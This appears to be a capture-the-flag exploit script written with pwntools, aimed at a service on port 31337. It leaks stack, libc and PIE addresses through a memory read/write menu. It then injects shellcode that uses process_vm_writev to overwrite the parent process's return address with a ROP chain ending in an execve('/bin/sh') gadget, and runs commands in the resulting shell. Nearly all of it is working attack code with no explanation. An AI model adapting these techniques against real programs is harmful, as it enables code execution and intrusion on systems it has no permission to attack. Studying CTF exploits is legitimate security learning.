#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


exe = context.binary = ELF(args.EXE or './challenge')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)

gdbscript = '''
tbreak main
set follow-fork-mode child
set detach-on-fork off
breakrva 0x1613
continue
'''.format(**locals())

# -- Exploit goes here --

libc = ELF('./libc.so.6')


io = remote(HOST, int(PORT))

def read_vm(addr):
    sla(b'Choice: \n', b'1')
    sla(b'Address: \n', hex(addr).encode())
    ru(b'Value: ')
    leak = rl(False)
    leak = int(leak.decode(), 16)
    return leak

def write_vm(addr, val):
    sla(b'Choice: \n', b'2')
    sla(b'Value: \n', hex(val).encode())
    sla(b'Address: \n', hex(addr).encode())

def write_vm_buf(addr, buf):
    for i in range(0, len(buf), 8):
        write_vm(addr+i, u64(buf[i:i+8]))


retaddr =0x7ffeececa818
leak = 0x7ffeececa928
retaddr_val = 0x7fe8e6029d90
off = leak-retaddr


stack_leak = read_vm(0)
ret_addr_addr = stack_leak-off
print('ret_addr_addr', hex(ret_addr_addr))

libc_leak = read_vm(ret_addr_addr)
print('libc_leak', hex(libc_leak))

pie_leak = read_vm(ret_addr_addr+0x10)
pie_leak -= exe.sym['main']
exe.address = pie_leak
print('pie_leak', hex(pie_leak))



libc_ret = 0x7f09da429d90
libc_writable = 0x7f09da61a520
libc_write_off = libc_writable-libc_ret

rbp = libc_leak+libc_write_off




'''

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''




libc_one_gadget = 0x7f09da4ebc88
libc_one_gadget_off = libc_one_gadget-libc_ret

one_gadget = libc_leak+libc_one_gadget_off


libc.address = libc_leak-0x29d90
rop = ROP(libc)
pop_rbp_addr = rop.find_gadget(['pop rbp', 'ret']).address


parent_ret_addr = 0x7ffeff226e78 #0x7ffef44ecd18
stack_leak_leak = 0x7ffeff226f88

parent_ret_addr_off = stack_leak_leak-parent_ret_addr


parent_ret_addr_addr = stack_leak-parent_ret_addr_off
print('parent_ret_addr_addr', hex(parent_ret_addr_addr))



base = exe.address+0x1000+0x1000

shellcode = asm(
'''
    mov rsp, {}
    mov rbp, rsp
    mov rax, SYS_getppid
    syscall
    push rax

    mov rdi, rax
    mov rsi, {}
    mov rdx, 1
    mov r10, {}
    mov r8, 1
    mov r9, 0
    mov rax, SYS_process_vm_writev
    syscall

    mov rdi, 0
    mov rax, SYS_exit_group
    syscall

'''.format(
    base+0x200,
    base+0x200, # lvec
    base+0x200+0x10), # rvec
vma=base)


# struct
structs = flat(
    # lvec
    base+0x300, # iov_base
    0x40, # iov_len

    # rvec
    parent_ret_addr_addr, # iov_base
    0x40, # iov_len
)

data = flat(
    # cyclic(0x40)
    pop_rbp_addr,
    rbp,
    rop.rsi.address,
    0,
    one_gadget

)


payload = flat(
    shellcode.ljust(0x200),
    structs.ljust(0x100),
    data
)



write_vm_buf(base, payload)

# overwrite return addr of child
write_vm(ret_addr_addr, base)


print('stack_leak', hex(stack_leak))
print('parent_ret_addr_addr', hex(parent_ret_addr_addr))
print('parent_ret_addr_off', hex(parent_ret_addr_off))


nops = u64(b'\x90'*5+b'\xff\xcb\x75')

write_vm(exe.address+0x147F, nops)

sleep(3)



# exit
sla(b'Choice: \n', b'3')

sleep(1)
sl(b'ls')
sl(b'pwd')
sl(b'./submitter')

print(io.recvrepeat(timeout=1))


io.close()
exit(0)

